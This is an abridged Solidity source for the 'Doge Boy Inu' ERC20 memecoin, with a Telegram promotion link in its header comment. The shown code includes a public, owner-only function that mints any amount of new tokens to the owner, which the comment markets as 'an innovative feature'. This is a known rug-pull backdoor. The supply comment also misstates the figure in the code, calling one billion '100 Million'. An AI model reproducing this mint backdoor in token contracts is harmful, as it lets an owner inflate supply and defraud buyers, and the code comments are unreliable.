...
//
// $DogeBoyInu proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/+VC6bJw8heWFlMDU1
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Dogeboyinu(uint256 amount) public onlyOwner {
 _Dogeboyinu(msg.sender, amount);
    }
    ...
    function _Dogeboyinu(address account, uint256 amount) internal virtual {
...
contract $Dogeboyinu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Doge Boy Inu", "DGBOYINU") {
     _Dogeboyinu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}